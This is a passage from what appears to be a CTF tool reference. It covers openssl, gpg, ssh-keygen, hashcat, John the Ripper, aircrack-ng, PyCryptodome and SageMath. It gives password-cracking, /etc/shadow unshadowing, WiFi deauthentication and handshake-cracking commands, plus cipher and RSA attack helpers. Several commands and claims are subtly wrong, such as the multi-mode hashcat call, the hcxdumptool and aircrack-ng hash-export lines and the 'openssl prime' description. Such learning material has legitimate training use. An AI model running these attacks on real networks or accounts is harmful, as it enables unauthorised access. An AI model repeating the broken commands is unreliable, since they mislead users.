computed_hmac=$(echo -n "message" | openssl dgst -sha256 -hmac "secret_key" | awk '{print $2}')
if [ "$known_hmac" = "$computed_hmac" ]; then echo "HMAC valid"; fi
```

##### Certificate Operations

Generate self-signed certificate:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

`-x509` creates self-signed certificate. `-newkey rsa:2048` generates 2048-bit RSA key. `-days 365` sets validity period. `-nodes` prevents password protection of the key file.

View certificate contents:

```bash
openssl x509 -in cert.pem -text -noout
```

Extract specific fields:

```bash
openssl x509 -in cert.pem -noout -subject
openssl x509 -in cert.pem -noout -issuer
openssl x509 -in cert.pem -noout -dates
```

Extract public key from certificate:

```bash
openssl x509 -in cert.pem -pubkey -noout > cert_public.pem
```

##### SSL/TLS Protocol Analysis

Connect to SSL/TLS server and display certificate chain:

```bash
openssl s_client -connect example.com:443
```

This opens interactive SSL/TLS session. Type HTTP requests (e.g., `GET / HTTP/1.1`) to interact. Press Ctrl+C to exit. For non-interactive certificate inspection:

```bash
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text -noout
```

Extract certificate chain:

```bash
echo | openssl s_client -connect example.com:443 -showcerts 2>/dev/null | grep -A 30 "BEGIN CERTIFICATE"
```

Test for specific SSL/TLS vulnerabilities:

```bash
openssl s_client -connect example.com:443 -ssl3
openssl s_client -connect example.com:443 -tls1
openssl s_client -connect example.com:443 -tls1_2
```

Attempt connection with older protocol versions to detect legacy protocol support.

##### Key Format Conversion

Convert PEM private key to PKCS#8 format:

```bash
openssl pkcs8 -topk8 -in private.pem -out private_pkcs8.pem -nocrypt
```

`-nocrypt` skips password protection. Remove for password-protected output.

Convert PKCS#12 (`.p12`, `.pfx`) to PEM:

```bash
openssl pkcs12 -in certificate.p12 -out certificate.pem -nodes
```

`-nodes` outputs unencrypted private key. Separate private key and certificate:

```bash
openssl pkcs12 -in certificate.p12 -out private_key.pem -nocerts -nodes
openssl pkcs12 -in certificate.p12 -out certificate_only.pem -nokeys
```

##### Random Data Generation

Generate random bytes for keys, IVs, or salts:

```bash
openssl rand 32
openssl rand -hex 32
openssl rand -base64 32
```

Default outputs binary. `-hex` outputs hexadecimal. `-base64` outputs base64-encoded data.

Generate random primes (useful for RSA key generation understanding):

```bash
openssl prime 2048
```

Generates a random 2048-bit prime number.

##### Elliptic Curve Cryptography

Generate EC key pair:

```bash
openssl ecparam -genkey -name prime256v1 -out ec_private.pem
```

`-name prime256v1` specifies the curve (P-256). Other curves: `secp384r1`, `secp521r1`. Extract public key:

```bash
openssl ec -in ec_private.pem -pubout -out ec_public.pem
```

Sign data with EC private key:

```bash
openssl dgst -sha256 -sign ec_private.pem -out signature.bin file.txt
```

Verify signature with EC public key:

```bash
openssl dgst -sha256 -verify ec_public.pem -signature signature.bin file.txt
```

Output: "Verified OK" or "Verification Failure".

### `gpg`

GPG (GNU Privacy Guard) provides encryption, decryption, and digital signing using OpenPGP standard. It's commonly used in CTF challenges for key management and cryptographic operations.

##### Key Generation and Management

Generate new GPG key pair:

```bash
gpg --gen-key
```

Interactive menu prompts for key type (RSA recommended), key size (4096-bit for strength), validity period, name, and email. Alternative batch mode:

```bash
gpg --batch --gen-key <<EOF
%echo Generating key
Key-Type: RSA
Key-Length: 4096
Name-Real: CTF Player
Name-Email: ctf@example.com
Expire-Date: 0
%no-ask-passphrase
%echo done
EOF
```

List keys in keyring:

```bash
gpg --list-keys
gpg --list-secret-keys
```

Display full key fingerprints:

```bash
gpg --fingerprint
```

Export public key:

```bash
gpg -a --export user_email@example.com > public_key.asc
```

`-a` outputs ASCII-armored format (base64-encoded PEM). Export without `-a` produces binary.

Import public key:

```bash
gpg --import public_key.asc
```

Delete key:

```bash
gpg --delete-key user_email@example.com
gpg --delete-secret-key user_email@example.com
```

Trust key:

```bash
gpg --edit-key user_email@example.com
# Interactive menu: trust, quit
```

##### Encryption and Decryption

Encrypt file with recipient's public key:

```bash
gpg -e -r recipient@example.com plaintext.txt
```

Output: `plaintext.txt.gpg`. Encrypt for multiple recipients:

```bash
gpg -e -r recipient1@example.com -r recipient2@example.com plaintext.txt
```

Symmetric encryption (password-based, no key pair required):

```bash
gpg -c plaintext.txt
```

Prompts for passphrase. Output: `plaintext.txt.gpg`.

Decrypt:

```bash
gpg -d plaintext.txt.gpg
```

Output goes to stdout by default. Redirect to file:

```bash
gpg -d -o decrypted.txt plaintext.txt.gpg
```

Decrypt without passphrase prompt (if private key is not password-protected, rare):

```bash
gpg --no-symkey-cache -d plaintext.txt.gpg
```

##### Digital Signatures

Sign file with private key:

```bash
gpg -s plaintext.txt
```

Output: `plaintext.txt.gpg` (binary signature). ASCII-armored signature:

```bash
gpg -a -s plaintext.txt
```

Output: `plaintext.txt.asc`. Create detached signature (separate from content):

```bash
gpg -a -b plaintext.txt
```

Output: `plaintext.txt.asc` (signature only), original file unchanged.

Verify signature:

```bash
gpg --verify plaintext.txt.asc plaintext.txt
```

Or with combined signature:

```bash
gpg --verify plaintext.txt.gpg
```

Output: "Good signature from..." or "Bad signature from...".

##### Keyserver Operations

Search for public keys on keyserver:

```bash
gpg --search-keys user@example.com
```

Interactive menu displays matching keys for import.

Upload public key to keyserver:

```bash
gpg --send-keys key_id
```

Retrieve key from keyserver:

```bash
gpg --recv-keys key_id
```

[Inference] In CTF scenarios with network-isolated environments, keyserver operations fail. Distribute keys via files instead.

##### Batch Processing

Decrypt multiple files:

```bash
for file in *.gpg; do
  gpg -d -o "${file%.gpg}" "$file"
done
```

This loop decrypts all `.gpg` files in current directory, removing `.gpg` extension from output filenames.

Encrypt directory contents:

```bash
tar -czf - directory/ | gpg -e -r recipient@example.com > directory.tar.gz.gpg
```

Pipes compressed tar archive through GPG encryption.

### `ssh-keygen`

SSH-keygen generates, manages, and converts SSH key pairs used for secure shell authentication and other cryptographic operations. It's essential for CTF challenges involving SSH protocol analysis and key extraction.

##### Key Generation

Generate RSA key pair (3072-bit recommended for modern security):

```bash
ssh-keygen -t rsa -b 3072 -f ~/.ssh/id_rsa -N ""
```

`-t rsa` specifies RSA algorithm. `-b 3072` sets 3072-bit key size. `-f` specifies output path. `-N ""` sets empty passphrase (risky in production, acceptable for CTF).

Generate ED25519 key pair (modern, smaller, faster):

```bash
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
```

ED25519 keys are 256-bit, providing equivalent strength to 3072-bit RSA with better performance.

Generate ECDSA key pair:

```bash
ssh-keygen -t ecdsa -b 521 -f ~/.ssh/id_ecdsa -N ""
```

`-b 521` specifies P-521 curve. Also valid: `256` (P-256), `384` (P-384).

##### Key Format Conversion

Convert OpenSSH private key to PEM format (for OpenSSL compatibility):

```bash
ssh-keygen -p -N "" -m pem -f ~/.ssh/id_rsa
```

`-p` prompts for current passphrase (none in this case with `-N ""`). `-m pem` converts to PEM format. `-f` specifies key file.

Convert to PKCS8 format:

```bash
ssh-keygen -p -N "" -m pkcs8 -f ~/.ssh/id_rsa
```

Extract public key from private key:

```bash
ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub
```

`-y` outputs public key in OpenSSH format.

Convert OpenSSH public key to PEM (for OpenSSL operations):

```bash
ssh-keygen -f ~/.ssh/id_rsa.pub -e -m pem > ~/.ssh/id_rsa_public.pem
```

`-e` exports public key. `-m pem` specifies PEM format. Without `-m`, outputs PKCS#1 format.

##### Key Fingerprinting and Validation

Display key fingerprint:

```bash
ssh-keygen -l -f ~/.ssh/id_rsa.pub
```

Output: `3072 SHA256:abcd1234...== user@host (RSA)`

Change fingerprint format (MD5 for compatibility with older systems):

```bash
ssh-keygen -l -E md5 -f ~/.ssh/id_rsa.pub
```

Output: `3072 MD5:ab:cd:12:34:...== (RSA)`

Validate key:

```bash
ssh-keygen -l -f ~/.ssh/id_rsa
```

If key is corrupted, ssh-keygen returns error. Valid keys display fingerprint.

##### Passphrase Management

Change key passphrase:

```bash
ssh-keygen -p -f ~/.ssh/id_rsa
```

Prompts for old passphrase, then new passphrase.

Remove passphrase (convert to unencrypted key):

```bash
ssh-keygen -p -N "" -f ~/.ssh/id_rsa
```

`-N ""` sets new passphrase to empty. Prompts for current passphrase first.

[Unverified] In CTF scenarios, CTF organizers may provide private keys with unknown passphrases. Brute-forcing SSH key passphrases is computationally expensive (hundreds of iterations per attempt). This is typically not viable within CTF time constraints.

##### Key Comments and Metadata

Change key comment (email or identifier):

```bash
ssh-keygen -c -f ~/.ssh/id_rsa -C "new_comment@example.com"
```

`-c` modifies comment. `-C` specifies new comment. Comments are metadata only and don't affect cryptographic operations.

View key details including comment:

```bash
ssh-keygen -l -f ~/.ssh/id_rsa.pub
```

##### Randomart Visualization

Generate ASCII art fingerprint visualization:

```bash
ssh-keygen -l -v -f ~/.ssh/id_rsa.pub
```

`-v` enables verbose output, displaying randomart. Randomart provides visual key fingerprint for comparison (humans more easily detect visual anomalies than hex strings).

Example randomart:

```
+---[RSA 3072]----+
|      .o.        |
|       .o+       |
|      o.+o.      |
|     o.o+o o.    |
|    . .+S..o .   |
|     E + +....   |
|      . = o.+.   |
|         o.o+.   |
|          .. o+  |
+----[SHA256]-----+
```

##### Batch Key Generation

Generate multiple key pairs for testing:

```bash
for i in {1..5}; do
  ssh-keygen -t rsa -b 2048 -f ~/.ssh/test_key_$i -N ""
done
```

Creates test_key_1 through test_key_5. Useful for simulating multi-user SSH scenarios in CTF challenges.

### `hashcat`

Hashcat is a GPU-accelerated password cracking tool supporting 300+ hash types. It's critical for CTF challenges involving hash extraction and brute-force attack scenarios.

##### Hash Type Identification

Identify hash type:

```bash
hashcat -h | grep -i "md5"
hashcat -h | grep -i "sha256"
```

Common hash modes:

- 0: MD5
- 100: SHA1
- 1400: SHA2-256
- 1700: SHA2-512
- 3200: bcrypt
- 5500: NetNTLMv2
- 13100: Kerberos 5 TGT

##### Basic Dictionary Attack

Crack password hash with wordlist:

```bash
hashcat -m 0 hash.txt wordlist.txt
```

`-m 0` specifies MD5 mode. `hash.txt` contains hash (one per line). `wordlist.txt` is dictionary file. Output displays cracked passwords:

```
hash.txt:password123 [CRACKED]
```

Rules-based attack (modify dictionary entries):

```bash
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule
```

`-r` applies rule file (modify, append, prepend characters). Hashcat includes built-in rules: `best64.rule`, `hybrid.rule`, `dive.rule`.

##### Brute Force Attack

Brute force attack with charset:

```bash
hashcat -m 0 hash.txt -a 3 -1 ?l?u?d?s ?1?1?1?1?1?1?1?1
```

`-a 3` specifies brute force mode. `-1` defines custom charset (lowercase, uppercase, digits, special). `?1?1?1?1?1?1?1?1` generates all 8-character combinations from custom charset.

Standard charsets:

- `?l`: Lowercase letters (a-z)
- `?u`: Uppercase letters (A-Z)
- `?d`: Digits (0-9)
- `?s`: Special characters (!@#$%^&*)

Example: 6-character alphanumeric:

```bash
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l
```

Incremental length attack (try 1-8 character passwords):

```bash
hashcat -m 0 hash.txt -a 3 ?l -i --increment-max 8
```

`-i` enables increment mode. `--increment-max 8` sets maximum length.

##### GPU and Performance Optimization

List available GPUs:

```bash
hashcat -I
```

Specify GPU device:

```bash
hashcat -d 1,2 -m 0 hash.txt wordlist.txt
```

`-d 1,2` uses GPUs 1 and 2. Improves performance for large hash sets.

Optimize performance:

```bash
hashcat -w 3 -m 0 hash.txt wordlist.txt
```

`-w` sets workload profile (1=low, 2=medium, 3=high). Higher values use more GPU memory and compute but may timeout.

Session management:

```bash
hashcat --session mysession -m 0 hash.txt wordlist.txt
```

`--session` names the session. Resume:

```bash
hashcat --session mysession --restore
```

##### Hybrid Attacks

Combine wordlist and brute force:

```bash
hashcat -m 0 hash.txt -a 6 wordlist.txt ?d?d
```

`-a 6` is wordlist + mask mode. Appends 2 digits to each dictionary word.

Prepend brute force:

```bash
hashcat -m 0 hash.txt -a 7 ?u wordlist.txt
```

`-a 7` is mask + wordlist mode. Prepends uppercase letter to each dictionary word.

##### Mask Files

Create reusable mask for complex patterns:

```bash
echo "?l?l?l?l?d?d?d?d" > mask.txt
hashcat -m 0 hash.txt -a 3 mask.txt
```

Multi-mask attack (try multiple masks):

```bash
hashcat -m 0 hash.txt -a 3 -x mask1.txt -x mask2.txt
```

##### Output and Outfile Options

Save cracked passwords to file:

```bash
hashcat -m 0 hash.txt wordlist.txt -o cracked.txt
```

Display results in different format:

```bash
hashcat -m 0 hash.txt wordlist.txt --outfile-format=3
```

Formats: 1=hash:password, 2=password only, 3=hash:password with hash type.

##### Advanced Hash Scenarios

Multiple hash types in single file:

```bash
hashcat -m 0,100 hashes.txt wordlist.txt
```

`-m 0,100` attempts both MD5 and SHA1 modes. Hashcat auto-detects applicable hashes.

Salted hash cracking (bcrypt, scrypt):

```bash
hashcat -m 3200 bcrypt_hashes.txt wordlist.txt
```

Hashcat automatically handles salt extraction from bcrypt format.

LM hash cracking (Windows legacy):

```bash
hashcat -m 3000 lm_hashes.txt wordlist.txt
```

LM hashes are case-insensitive and split into 7-character chunks, making brute force faster.

NTLM hash cracking (Windows modern):

```bash
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
```

### `john`

John the Ripper is a password cracking tool emphasizing speed and flexibility. It supports diverse hash formats and attack modes, complementing hashcat in CTF scenarios.

##### Hash Type Recognition

John auto-detects hash type:

```bash
john hashes.txt
```

John analyzes format and applies appropriate cracking method. List supported formats:

```bash
john --list=formats
john --list=formats | grep -i md5
```

Specify hash type explicitly:

```bash
john --format=md5 hashes.txt
john --format=bcrypt hashes.txt
john --format=ntlm hashes.txt
```

##### Dictionary Attack

Crack hashes with wordlist:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Progress displays in-terminal. Stop with Ctrl+C and resume:

```bash
john --restore
```

`--restore` resumes previous session from saved state file.

Custom wordlist:

```bash
john hashes.txt --wordlist=custom.txt
```

##### Single Crack Mode

Apply simple mangling rules to username:

```bash
john --single hashes.txt
```

`--single` mode uses default rules (uppercase first letter, reverse, append numbers). Effective for hashes with known usernames.

Combine with wordlist:

```bash
john --wordlist=passwords.txt --single hashes.txt
```

##### Incremental Mode (Brute Force)

Brute force with character set:

```bash
john --incremental=digits hashes.txt
```

Predefined charsets: `digits`, `loweralpha`, `uperalpha`, `alpha`, `lanman`, `alnum`, `all`.

Create custom incremental mode (in john.conf):

```
[Incremental:Custom]
File = /path/to/charset
MinLen = 4
MaxLen = 8
CharCount = 62
```

Then:

```bash
john --incremental=Custom hashes.txt
```

##### External Mode Scripting

Write custom rule in C-like syntax:

```bash
cat > custom.rules <<EOF
// Double each character
[0-9]
>!X"$0" X"$0"
EOF

john hashes.txt --wordlist=pass.txt --rules=custom.rules
```

[Inference] Writing efficient external mode scripts requires understanding John's proprietary syntax. Documentation is sparse, making this advanced technique difficult to master within CTF timeframes.

##### Combining Multiple Wordlists

Process multiple wordlists sequentially:

```bash
john hashes.txt --wordlist=wordlist1.txt --wordlist=wordlist2.txt
```

Or concatenate before running:

```bash
cat wordlist1.txt wordlist2.txt > combined.txt
john hashes.txt --wordlist=combined.txt
```

##### Session Management

Named session:

```bash
john --session=ctf_session hashes.txt
```

Resume:

```bash
john --session=ctf_session --restore
```

View status:

```bash
john --session=ctf_session --status
```

##### Format-Specific Operations

Extract hashes from system files:

```bash
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

`unshadow` merges passwd and shadow files into format John accepts.

Crack Windows NTLM hashes:

```bash
john --format=nt hashes.txt --wordlist=rockyou.txt
```

Crack Kerberos 5 TGT:

```bash
john --format=krb5tgs hashes.txt --wordlist=passwords.txt
```

Crack SSH key passphrase:

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=passwords.txt
```

`ssh2john` converts SSH key format for John processing.

##### Optimized Performance

Multi-threaded cracking:

```bash
john --fork=4 hashes.txt
```

`--fork=4` uses 4 processes. Set to number of CPU cores for optimal performance.

GPU acceleration (OpenCL, if compiled with support):

```bash
john --device-id=all hashes.txt
```

Not all John builds include GPU support; compile from source for GPU acceleration.

##### Output Filtering

Show cracked passwords only:

```bash
john hashes.txt --show
```

Show statistics:

```bash
john hashes.txt --status
```

Export cracked hashes:

```bash
john hashes.txt --format=md5 --wordlist=pass.txt -o results.txt
```

### `aircrack-ng`

Aircrack-ng is a suite for WiFi security testing, including wireless traffic capture, password cracking, and protocol analysis. In CTF scenarios involving wireless networks, it's essential for hash extraction and brute-force attacks.

##### Capturing Wireless Traffic

Set wireless interface to monitor mode:

```bash
sudo airmon-ng start wlan0
```

Creates monitoring interface (e.g., `wlan0mon`). Verify:

```bash
iwconfig wlan0mon
```

Capture WiFi traffic to PCAP file:

```bash
sudo airodump-ng -w capture -c 6 wlan0mon
```

`-w capture` writes to `capture-01.cap`. `-c 6` focuses on channel 6. Scans all channels if `-c` omitted (slower).

Target specific network:

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
```

`--bssid` filters to single network. Monitor until handshake captured (top-right shows "WPA handshake: AA:BB:CC:DD:EE:FF").

##### Deauthentication Attack

Force clients to reconnect, capturing WPA handshake:

```bash
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

`-0` specifies deauth attack. `10` is packet count. `-a` is target BSSID. Clients re-authenticate within seconds, enabling handshake capture.

Target specific client:

```bash
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c XX:XX:XX:XX:XX:XX wlan0mon
```

`-c` specifies target client MAC.

##### Extracting HASH from PCAP

Extract hashes for offline cracking:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

Aircrack attempts to crack directly if wordlist provided. Output:

```
KEY FOUND! [ PASSWORD123 ]
```

[Unverified] The success rate depends on wordlist quality and password complexity. Weak passwords (common dictionary words) crack within seconds on modern hardware.

Extract hash for external tools (john, hashcat):

```bash
hcxdumptool -i capture-01.cap -o hash.hc22000
```

Alternative for older format:

```bash
aircrack-ng capture-01.cap --output=hashcat
```

Generates hashcat-compatible format for GPU-accelerated cracking.

Convert to John format:

```bash
wpa2john capture-01.cap > capture.john
john capture.john --wordlist=rockyou.txt
```

##### WEP Cracking

WEP (legacy, broken encryption) cracks differently. Capture traffic:

```bash
sudo airodump-ng -c 6 -w wep_capture wlan0mon
```

Arpreplay to generate traffic:

```bash
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
```

`-3` specifies ARP replay attack. Captures sufficient IV data for cracking.

Crack WEP key:

```bash
aircrack-ng wep_capture-01.cap
```

WEP cracks with statistical analysis of collected IVs. Success rate increases with IV count (typically 100,000+ IVs needed).

##### Session Resumption

Resume incomplete capture:

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture --continue wlan0mon
```

`--continue` appends to existing capture file instead of overwriting.

##### Offline Analysis

Analyze capture without live interface:

```bash
aircrack-ng capture-01.cap -w rockyou.txt
```

Multi-file analysis:

```bash
aircrack-ng capture-01.cap capture-02.cap -w rockyou.txt
```

Processes multiple captures sequentially, useful for distributed captures.

##### GPS Tagging and Metadata

Capture GPS coordinates during sniffing (requires GPS device):

```bash
sudo airodump-ng -w capture -c 6 --gpsd wlan0mon
```

`--gpsd` integrates gpsd daemon for geolocation. Generates `.gps` file with coordinates.

View captured network metadata:

```bash
airodump-ng capture-01.cap
```

Displays BSSID, channel, signal strength, encryption type, and client count from existing capture.

##### WPA3 Considerations

[Unverified] WPA3 (Simultaneous Authentication of Equals) replaces traditional four-way handshake with Simultaneous Authentication of Equals (SAE), making traditional capture-based attacks ineffective. Current aircrack-ng versions have limited WPA3 support.

Attempt WPA3 capture:

```bash
sudo airodump-ng -c 6 -w wpa3_capture wlan0mon
```

Monitor for WPA3 networks (identified as "WPA3" in encryption column). Offline cracking requires SAE-specific tools or vulnerability exploitation (not mainstream in standard aircrack-ng).

##### Cleanup

Disable monitor mode after capture:

```bash
sudo airmon-ng stop wlan0mon
```

Restores wireless interface to managed mode. Necessary to restore normal WiFi connectivity.

##### Integration with Hash Cracking

Workflow: Capture → Extract Hash → Crack with john/hashcat

```bash
# 1. Capture handshake
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# 2. Extract hash for hashcat
hcxdumptool -i capture-01.cap -o hash.hc22000

# 3. Crack with GPU
hashcat -m 22000 hash.hc22000 rockyou.txt

# Or with john
wpa2john capture-01.cap > capture.john
john capture.john --wordlist=rockyou.txt --fork=4
```

Related Topics: Wireless Protocol Analysis (802.11 frame dissection), Pre-Shared Key Derivation (PBKDF2, PBKDF2-HMAC-SHA1), Rainbow Table Generation (preprocessing for fast lookups), Distributed Cracking (coordinating multiple systems for large keyspaces).

---

## Optional Installation

### python3-pycryptodome

PyCryptodome is a self-contained Python cryptographic library, fork of PyCrypto, providing implementations of cryptographic primitives essential for CTF cryptography challenges.

#### Installation Methods

**Kali Linux:**

bash

```bash
# APT installation
sudo apt update
sudo apt install python3-pycryptodome

# Verify installation
python3 -c "from Crypto.Cipher import AES; print('PyCryptodome installed')"

# Check version
python3 -c "import Crypto; print(Crypto.__version__)"
```

**pip Installation:**

bash

```bash
# System-wide installation
sudo pip3 install pycryptodome

# User installation (no sudo required)
pip3 install --user pycryptodome

# Virtual environment (recommended for isolated projects)
python3 -m venv ctf_env
source ctf_env/bin/activate
pip3 install pycryptodome
```

**Conflict Resolution:**

bash

```bash
# Remove PyCrypto if installed (conflicts with PyCryptodome)
pip3 uninstall pycrypto

# Install PyCryptodome as drop-in replacement
pip3 install pycryptodome

# Alternative: PyCryptodomex (separate namespace)
pip3 install pycryptodomex
# Import as: from Cryptodome.Cipher import AES
```

#### Core Modules and Usage

**Block Ciphers:**

python

```python
from Crypto.Cipher import AES, DES, DES3, Blowfish, ARC4

# AES-256 CBC encryption
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)  # 256-bit key
iv = get_random_bytes(16)   # 128-bit IV
cipher = AES.new(key, AES.MODE_CBC, iv)

plaintext = b"Secret message"
padded = pad(plaintext, AES.block_size)
ciphertext = cipher.encrypt(padded)

# Decryption
decipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(decipher.decrypt(ciphertext), AES.block_size)

# AES-GCM (authenticated encryption)
cipher = AES.new(key, AES.MODE_GCM)
ciphertext, tag = cipher.encrypt_and_digest(plaintext)
nonce = cipher.nonce

# Decryption with verification
decipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
decrypted = decipher.decrypt_and_verify(ciphertext, tag)
```

**Hash Functions:**

python

```python
from Crypto.Hash import SHA256, SHA512, MD5, SHA1, SHA3_256

# SHA-256 hash
h = SHA256.new()
h.update(b"data to hash")
digest = h.hexdigest()

# HMAC
from Crypto.Hash import HMAC, SHA256
secret = b"secret_key"
h = HMAC.new(secret, digestmod=SHA256)
h.update(b"message")
mac = h.hexdigest()

# SHA3-256
from Crypto.Hash import SHA3_256
h = SHA3_256.new()
h.update(b"data")
digest = h.hexdigest()
```

**Public Key Cryptography:**

python

```python
from Crypto.PublicKey import RSA, DSA, ECC
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import pkcs1_15

# RSA key generation
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# RSA encryption (PKCS#1 OAEP)
recipient_key = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(recipient_key)
ciphertext = cipher.encrypt(b"Secret message")

# RSA decryption
private_key_obj = RSA.import_key(private_key)
decipher = PKCS1_OAEP.new(private_key_obj)
plaintext = decipher.decrypt(ciphertext)

# RSA signature (PKCS#1 v1.5)
from Crypto.Hash import SHA256
message = b"Message to sign"
h = SHA256.new(message)
signature = pkcs1_15.new(private_key_obj).sign(h)

# Verify signature
try:
    pkcs1_15.new(recipient_key).verify(h, signature)
    print("Signature valid")
except (ValueError, TypeError):
    print("Signature invalid")
```

**Key Derivation:**

python

```python
from Crypto.Protocol.KDF import PBKDF2, scrypt, HKDF
from Crypto.Hash import SHA256

# PBKDF2
password = b"password"
salt = b"random_salt"
key = PBKDF2(password, salt, dkLen=32, count=100000)

# scrypt (memory-hard KDF)
key = scrypt(password, salt, key_len=32, N=2**14, r=8, p=1)

# HKDF (HMAC-based KDF)
from Crypto.Hash import SHA256
master_key = b"master_secret"
salt = b"optional_salt"
info = b"context_info"
key = HKDF(master_key, 32, salt, SHA256, context=info)
```

**Random Number Generation:**

python

```python
from Crypto.Random import get_random_bytes
from Crypto.Random.random import randint, choice

# Cryptographically secure random bytes
random_bytes = get_random_bytes(16)

# Random integer in range
random_int = randint(1, 100)

# Random choice from list
random_element = choice([1, 2, 3, 4, 5])
```

#### CTF-Specific Utilities

**CBC Bit Flipping:**

python

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Modify ciphertext to alter plaintext
def flip_bit(ciphertext, block_num, byte_pos, bit_pos):
    ct_list = list(ciphertext)
    ct_list[block_num * 16 + byte_pos] ^= (1 << bit_pos)
    return bytes(ct_list)

# XOR manipulation for known plaintext
def xor_bytes(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])

# Modify previous block to change current block plaintext
known_plain = b"user=guest"
desired_plain = b"user=admin"
xor_diff = xor_bytes(known_plain, desired_plain)
# Apply xor_diff to previous ciphertext block
```

**ECB Detection and Exploitation:**

python

```python
def detect_ecb(ciphertext, block_size=16):
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# ECB byte-at-a-time attack helper
def ecb_oracle_attack(oracle, block_size=16):
    # oracle is a function that encrypts controlled input
    known = b""
    
    for i in range(256):  # Assuming 256-byte secret
        prefix = b"A" * (block_size - 1 - (len(known) % block_size))
        target_block = oracle(prefix)[:block_size]
        
        for byte in range(256):
            test = oracle(prefix + known + bytes([byte]))[:block_size]
            if test == target_block:
                known += bytes([byte])
                break
    
    return known
```

### sage (SageMath)

SageMath is a comprehensive mathematics software system integrating numerous open-source packages, essential for advanced cryptographic attacks involving number theory, elliptic curves, and lattice-based cryptography.

#### Installation Methods

**Docker Installation (Recommended):**

bash

```bash
# Pull SageMath Docker image
docker pull sagemath/sagemath:latest

# Run interactive SageMath session
docker run -it sagemath/sagemath:latest

# Mount current directory for file access
docker run -it -v $(pwd):/home/sage/work sagemath/sagemath:latest

# Run Sage Jupyter notebook
docker run -p 8888:8888 sagemath/sagemath:latest sage-jupyter
```

**APT Installation (Kali):**

bash

```bash
# Install from repositories
sudo apt update
sudo apt install sagemath

# Launch SageMath
sage

# Run Sage script
sage script.sage

# Convert .sage to .py
sage --preparse script.sage
```

**Build from Source:**

bash

```bash
# Prerequisites
sudo apt install build-essential m4 perl python3 python3-distutils

# Clone repository
git clone https://github.com/sagemath/sage.git
cd sage

# Configure and build (takes several hours)
make configure
./configure
make

# Run SageMath
./sage
```

**CoCalc (Online Alternative):**

```
# Browser-based SageMath environment
# URL: https://cocalc.com
# No installation required, includes collaboration features
```

#### Core Mathematical Features

**Integer Factorization:**

python

```python
# Launch sage
sage

# Factor large integers
n = 123456789012345678901234567890
factor(n)

# Specific factorization methods
# ECM (Elliptic Curve Method)
ecm.factor(n, B1=10000)

# Trial division
trial_division(n, 10000)

# Pollard's rho
Integer(n).pollard_rho()

# Check primality
is_prime(n)
```

**Elliptic Curve Arithmetic:**

python

```python
# Define elliptic curve over finite field
p = 115792089237316195423570985008687907853269984665640564039457584007908834671663
a = 0
b = 7
E = EllipticCurve(GF(p), [a, b])

# Define point
G = E(55066263022277343669578718895168534326250603453777594175500187360389116729240,
      32670510020758816978083085130507043184471273380659243275938904335757337482424)

# Scalar multiplication
k = 12345
P = k * G

# Point addition
Q = G + P

# Discrete log problem (small curves only)
# P = k*G, find k
k = discrete_log(P, G, operation='+')
```

**RSA Attacks:**

python

```python
# Common modulus attack
n = 123456789...
e1 = 65537
e2 = 65539
c1 = ...  # ciphertext with e1
c2 = ...  # ciphertext with e2

# Extended Euclidean algorithm
def egcd(a, b):
    if b == 0:
        return (a, 1, 0)
    else:
        g, y, x = egcd(b, a % b)
        return (g, x, y - (a // b) * x)

g, s1, s2 = egcd(e1, e2)
if g == 1:
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    print(long_to_bytes(int(m)))

# Wiener's attack (small private exponent)
def wiener_attack(e, n):
    cf = continued_fraction(e / n)
    convergents = cf.convergents()
    
    for conv in convergents:
        k = conv.numerator()
        d = conv.denominator()
        
        if k == 0:
            continue
            
        phi = (e * d - 1) / k
        
        # Check if phi yields valid factors
        b = n - phi + 1
        discriminant = b^2 - 4*n
        
        if discriminant >= 0:
            sqrt_d = sqrt(discriminant)
            if sqrt_d in ZZ:
                return d
    
    return None
```

**Lattice Reduction (LLL Algorithm):**

python

```python
# LLL basis reduction
M = Matrix(ZZ, [[1, 2, 3], [4, 5, 6], [7, 8, 10]])
L = M.LLL()
print(L)

# Knapsack problem solving with LLL
def solve_knapsack_lll(public_key, target):
    n = len(public_key)
    M = Matrix(ZZ, n + 1, n + 1)
    
    # Build lattice
    for i in range(n):
        M[i, i] = 2
        M[i, n] = public_key[i]
    M[n, n] = target
    
    # Apply LLL
    L = M.LLL()
    
    # Extract solution
    for row in L.rows():
        if all(x in [0, 1] for x in row[:-1]):
            return [x for x in row[:-1]]
    
    return None

# CTF example: subset sum problem
public_key = [2, 3, 6, 13, 27, 52]
target = 82
solution = solve_knapsack_lll(public_key, target)
```

**Discrete Logarithm:**

python

```python
# Solve discrete log in finite field
p = 107
g = 2
h = 42

# Find x such that g^x ≡ h (mod p)
x = discrete_log(mod(h, p), mod(g, p))
print(f"Discrete log: {x}")

